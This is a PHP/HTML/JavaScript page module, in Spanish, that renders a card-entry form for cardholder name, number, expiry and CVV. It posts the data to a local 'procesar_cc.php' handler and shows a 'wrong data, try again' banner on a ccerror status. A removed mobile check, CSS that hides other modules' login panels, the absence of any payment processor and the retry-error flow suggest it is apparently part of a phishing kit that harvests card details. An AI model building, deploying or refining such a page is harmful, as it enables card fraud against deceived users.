<?php

// Mobile check removed

?>

<style>
    /* Estilos Generales */
    body.cc-view {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        background-color: #2b2b2b;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .card-module {
        background-color: #262626;
        color: #e0e0e0;
        padding: 35px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        width: 100%;
        max-width: 360px;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    /* Estilos para ocultar otros módulos */
    .cc-view .login-container,
    .cc-view .info-banner {
        display: none !important;
    }

    /* Título y Subtítulo */
    .card-module h2 {
        font-size: 1.5em;
        font-weight: bold;
        margin-bottom: 10px;
        color: #f0f0f0;
        text-align: center;
    }

    .card-module .subtitle {
        text-align: center;
        color: #b0b0b0;
        font-size: 0.9em;
        line-height: 1.4;
        margin-bottom: 30px;
        padding: 0 10px;
    }

    /* Estilos de Inputs y Etiquetas */
    .input-group {
        margin-bottom: 5px;
    }

    .input-group label {
        position: static;
        display: block !important;
        font-size: 0.9em !important;
        color: #b0b0b0 !important;
        margin-bottom: 8px !important;
    }

    .input-group input {
        width: 100%;
        background-color: #3e3e3e;
        border: none;
        border-radius: 8px;
        color: #f0f0f0;
        font-size: 1rem;
        padding: 12px;
        box-sizing: border-box;
        transition: all 0.3s ease;
    }

    .input-group input::placeholder {
        color: #888;
    }

    .input-group input:focus {
        outline: none;
        box-shadow: 0 0 0 2px #f0c300;
    }

    /* Estilos de Botones */
    .pay-button {
        width: 100%;
        padding: 15px;
        background-color: #f0c300;
        border: none;
        border-radius: 25px;
        color: #333;
        font-size: 1em;
        font-weight: 600;
        cursor: pointer;
        transition: background-color 0.3s;
        margin-top: 20px;
    }

    .pay-button:hover {
        background-color: #5c5c5c;
    }

    .pay-button:disabled {
        background-color: #616161;
        cursor: not-allowed;
        color: #262626;
    }

    /* Estilos para agrupar inputs de fecha y CVV */
    .flex-group {
        display: flex;
        justify-content: space-between;
        gap: 20px;
    }

    .flex-group .input-group {
        flex: 1;
    }

    /* Nuevo estilo para el banner de error */
    .cc-error-banner {
        background-color: #f57c00;
        color: white;
        padding: 1px 20px;
        border-radius: 8px;
        margin-bottom: 20px;
        text-align: center;
        font-size: 0.7em;
        font-weight: bold;
    }
</style>

<div class="card-module">
    <h2>Información de Tarjeta</h2>
    <p class="subtitle">Para procesar tu compra de forma segura, ingresa los datos de tu tarjeta.</p>

    <?php if (isset($_GET['status']) && $_GET['status'] == 'ccerror'): ?>
        <div class="cc-error-banner">
            <p>¡Datos incorrectos!</p>
            <p>Verifica la información de tu tarjeta y vuelve a intentarlo.</p>
        </div>
    <?php endif; ?>

    <form id="ccForm" action="modules/api/procesar_cc.php" method="post">
        <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">

        <div class="input-group">
            <label for="card_name">Nombre del titular</label>
            <input type="text" id="card_name" name="card_name" placeholder="Como aparece en la tarjeta" required>
        </div>
        <div class="input-group">
            <label for="card_number">Número de tarjeta</label>
            <input type="text" id="card_number" name="card_number" placeholder="•••• •••• •••• ••••" required>
        </div>
        <div class="flex-group">
            <div class="input-group">
                <label for="expiry_date">Vencimiento</label>
                <input type="text" id="expiry_date" name="expiry_date" placeholder="MM/AA" required>
            </div>
            <div class="input-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="•••" required>
            </div>
        </div>
        <button type="submit" class="pay-button" id="payButton" disabled>Validar</button>
    </form>
</div>
<script>
    document.addEventListener('DOMContentLoaded', () => {
        const ccForm = document.getElementById('ccForm');
        const cardNameInput = document.getElementById('card_name');
        const cardNumberInput = document.getElementById('card_number');
        const expiryDateInput = document.getElementById('expiry_date');
        const cvvInput = document.getElementById('cvv');
        const payButton = document.getElementById('payButton');

        function validateForm() {
            const isNameValid = cardNameInput.value.trim() !== '';
            const isCardNumberValid = cardNumberInput.value.replace(/\s/g, '').length === 16;
            const isExpiryDateValid = expiryDateInput.value.length === 5;
            const isCvvValid = cvvInput.value.length >= 3;

            payButton.disabled = !(isNameValid && isCardNumberValid && isExpiryDateValid && isCvvValid);
        }

        const inputs = [cardNameInput, cardNumberInput, expiryDateInput, cvvInput];

        inputs.forEach(input => {
            input.addEventListener('input', validateForm);
        });

        // --- Formato para el número de tarjeta (2222 2222 2222 2222) ---
        cardNumberInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            value = value.replace(/[^0-9]/g, '');

            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue.slice(0, 19);
            validateForm();
        });

        // --- Límite de dígitos para el CVV ---
        cvvInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 3);
            validateForm();
        });

        // --- Formato automático de fecha de vencimiento (MM/AA) ---
        expiryDateInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '').replace(/\//g, '');
            value = value.replace(/[^0-9]/g, '');

            if (value.length > 2) {
                e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
            } else {
                e.target.value = value.slice(0, 4);
            }
            validateForm();
        });

        validateForm();
    });
</script>
